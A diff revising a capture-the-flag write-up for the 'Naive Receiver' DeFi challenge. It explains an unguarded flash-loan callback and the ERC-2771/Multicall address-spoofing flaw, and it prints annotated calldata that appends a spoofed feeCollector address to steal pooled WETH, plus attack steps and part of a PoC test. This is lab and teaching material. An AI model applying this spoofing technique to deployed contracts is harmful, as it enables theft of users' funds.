@@ -14,25 +14,18 @@ All funds are at risk! Rescue all WETH from the user and the pool, and deposit i
 
 The `onFlashLoan` function in the `FlashLoanReceiver` contract is an implementation of the `IERC3156FlashBorrower` interface. However, in this implementation, the `initiator` and `data` parameters are completely ignored. Additionally, the function lacks any restrictions on who can initiate the flash loan.
 
-Since there are no restrictions on who can initiate flash loans, and each flash loan incurs a fixed fee of 1 WETH, an attacker can continuously initiate flash loans on behalf of the `FlashLoanReceiver`. This process will eventually drain all the WETH from the `FlashLoanReceiver` contract.
+Since there are no restrictions on who can initiate flash loans, and each flash loan incurs a fixed fee of 1 WETH, an attacker can continuously initiate flash loans on behalf of the `FlashLoanReceiver` contract. This process will eventually drain all the WETH from the `FlashLoanReceiver` contract.
 
 The prototype for the `onFlashLoan` function in the `IERC3156FlashBorrower` interface is:
 
 ```solidity
-function onFlashLoan(
-    address initiator,
-    address token,
-    uint256 amount,
-    uint256 fee,
-    bytes calldata data
-) external returns (bytes32);
+function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32);
 ```
 
 The implementation of the `onFlashLoan` function in the `FlashLoanReceiver` contract is as follows:
 
 ```solidity
-function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32)
-{
+function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32){
     assembly {
         // gas savings
         if iszero(eq(sload(pool.slot), caller())) {
@@ -59,13 +52,19 @@ function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes 
 
 ### Root Cause 2: Arbitrary Address Spoofing
 
-The `NaiveReceiverPool` contract supports meta-transactions (ERC-2771) and designates the `BasicForwarder` contract as a trusted forwarder. When interacting with `NaiveReceiverPool` via meta-transactions, the forwarder sends transactions on behalf of the user. However, in this context, the `msg.sender` during the transaction becomes the forwarder. To preserve the original user address, the forwarder appends the user's address to the end of the user's request in the `request.data`, as shown in the following code snippet:
+#### Quick Overview:
+
+Contracts that implement both Multicall and ERC-2771 are vulnerable to address spoofing. An attacker can exploit this by wrapping malicious calldata in a forwarded request, using Multicall's `delegatecall` to manipulate the `_msgSender()` resolution in subsequent calls.
+
+#### Demonstration
+
+The `NaiveReceiverPool` contract supports meta-transactions (ERC-2771) and designates the `BasicForwarder` contract as a trusted forwarder. When interacting with `NaiveReceiverPool` via meta-transactions, the forwarder sends transactions on behalf of the user. However, in this context, the `msg.sender` during the transaction becomes the forwarder. To preserve the original user address, the forwarder appends the user's address to the end of the user's request data, i.e. `request.data`, as shown in the following code snippet:
 
 ```solidity
 bytes memory payload = abi.encodePacked(request.data, request.from);
 ```
 
-When `NaiveReceiverPool` needs to retrieve the `msg.sender`, it does so by parsing the data through the `msgSender()` function, which reconstructs the original user address. The code for this is as follows:
+When `NaiveReceiverPool` needs to retrieve the actual user address (the "real" `msg.sender`), it does so using the `_msgSender()` function. This function is designed to reconstruct the original user address as follows:
 
 ```solidity
 function _msgSender() internal view override returns (address) {
@@ -77,9 +76,13 @@ function _msgSender() internal view override returns (address) {
 }
 ```
 
-The `_msgSender()` function checks whether the `msg.sender` is the forwarder and if the length of `msg.data` is at least 20 bytes. If both conditions are met, it returns the last 20 bytes of `msg.data` as the `msg.sender`.
+In this function, if `msg.sender` is the trusted forwarder and `msg.data` is at least 20 bytes long (indicating that the user’s address has been correctly appended), it extracts the last 20 bytes of `msg.data` to retrieve the original user address. If these conditions are not met, it defaults to the parent contract’s `_msgSender()` method, which returns the standard `msg.sender`.
 
-At this point, we understand how `msg.sender` is retrieved in the meta-transactions mode, but this is not sufficient to enable `msg.sender` spoofing. To achieve arbitrary `msg.sender` spoofing, we need to use the `multicall` function provided by `NaiveReceiverPool`, as shown in the following code:
+Do you see the potential vulnerability? When interacting with the `NaiveReceiverPool` contract through the forwarder, the `_msgSender()` function returns the last 20 bytes of `msg.data` as the user’s address, which is the "real" `msg.sender`.
+
+Next, we'll explore how to use `multicall` to inject an arbitrary address and deceive the `_msgSender()` function.
+
+Here is the `multicall` code snippet:
 
 ```solidity
 function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
@@ -91,11 +94,71 @@ function multicall(bytes[] calldata data) external virtual returns (bytes[] memo
 }
 ```
 
+This function allows multiple function calls to be executed in a single transaction. It takes an array of encoded function calls as input and executes each call using `functionDelegateCall`, returning an array of results.
+
+Our objective is to impersonate the `feeReceiver` and call `withdraw()` in `NaiveReceiverPool` contract. The `withdraw` function is as follows:
+
+```solidity
+function withdraw(uint256 amount, address payable receiver) external {
+    // Reduce deposits
+    deposits[_msgSender()] -= amount;
+    totalDeposits -= amount;
+
+    // Transfer ETH to designated receiver
+    weth.transfer(receiver, amount);
+}
+```
+
+Here is our attack flow:
+
+<img src="https://7795250.fs1.hubspotusercontent-na1.net/hub/7795250/hubfs/image-png-Dec-07-2023-07-22-47-6921-PM.png?width=2670&height=2135&name=image-png-Dec-07-2023-07-22-47-6921-PM.png" alt="Attack Flow Diagram" width="50%" />
+
+> [!NOTE]
+> This diagram is sourced from OpenZeppelin's blog [post](https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure#fbbbdc1e-1d3f-4214-9e8b-54c476486820).
+
+We can craft a malicious calldata for the forwarder to execute on our behalf. This calldata will invoke the `multicall` function in the `NaiveReceiverPool` contract. Within the `multicall` function, we will inject the `feeCollector` address into the `withdraw` function call in the `NaiveReceiverPool` contract.
+
+Here is how we inject the `feeCollector` address into the `withdraw` function call:
+
+The original calldata before injecting the feeCollector address
+
+```
+0xac9650d8                                                       -> multicall(bytes[]) signature
+0000000000000000000000000000000000000000000000000000000000000020 -> bytes[] offset
+0000000000000000000000000000000000000000000000000000000000000001 -> length of the array
+0000000000000000000000000000000000000000000000000000000000000020 -> bytes[1] offset
+0000000000000000000000000000000000000000000000000000000000000044 -> length of the bytes[1] in hexadecimal
+00f714ce                                                         -> withdraw(uint256,address) signature
+000000000000000000000000000000000000000000000036c090d0ca68880000 -> 1010 ether in hexadecimal
+00000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305C -> player address
+```
+
+This calldata represents a `multicall` that will invoke the `withdraw()` function with two parameters: the `amount` to withdraw (1010 ether) and the `recipient` address (player address). The ABI encoding length for `bytes[1]` is 68 bytes (0x44 in hexadecimal), which is the length of the first element in the `bytes[]` array
+
+To inject the `feeCollector` address, we'll modify the calldata as follows:
+
+```
+0xac9650d8
+0000000000000000000000000000000000000000000000000000000000000020
+0000000000000000000000000000000000000000000000000000000000000001
+0000000000000000000000000000000000000000000000000000000000000020
+0000000000000000000000000000000000000000000000000000000000000058 -> change to 0x58 due to the extra 20 bytes
+00f714ce
+000000000000000000000000000000000000000000000036c090d0ca68880000
+00000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305C
+aE0bDc4eEAC5E950B67C6819B118761CaAF61946                         -> append the feeCollector address
+```
+
+Explanation:
+
+1. **Length Adjustment**: We modify the calldata length from 68 bytes (0x44) to 88 bytes (0x58) to accommodate the extra 20 bytes needed for the `feeCollector` address.
+2. **Appending the `feeCollector` Address**: By appending the `feeCollector` address at the end of the calldata, we trick the `_msgSender()` function into interpreting this address as the original sender. This allows us to withdraw funds as if we were the `feeCollector`.
+
 ### Attack steps:
 
-1. Exhaust all WETH in the receiver contract by initiating a flashloan. Now, `NaiveReceiverPool` has 1,010 WETH.
-2. Craft a calldata to bypass `_msgSender()` and call the `withdraw()` function in `NaiveReceiverPool` to withdraw all WETH from the developer to the player.
-3. Transfer all WETH from the player to the recovery.
+1. Exhaust the WETH in the `receiver` contract by initiating a flash loan. At this point, the `NaiveReceiverPool` should contain 1,010 WETH.
+2. Craft a malicious calldata to impersonate the `feeCollector` and invoke the `withdraw` function in the `NaiveReceiverPool` contract, thereby withdrawing all WETH and transferring it to the `player`.
+3. Transfer all WETH from the `player` to the `recovery`.
 
 ## PoC test case
 
@@ -198,7 +261,7 @@ contract NaiveReceiverChallenge is Test {
         //00f714ce                                                         -> withdraw(uint256,address) signature
         //000000000000000000000000000000000000000000000036c090d0ca68880000 -> 1010 ether in hexadecimal
         //00000000000000000000000044E97aF4418b7a17AABD8090bEA0A471a366305C -> player address
-        //aE0bDc4eEAC5E950B67C6819B118761CaAF61946                         -> deployer address (the address we want to spoof as the `msg.sender`)
+        //aE0bDc4eEAC5E950B67C6819B118761CaAF61946                         -> feeCollector address
 
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from: player,
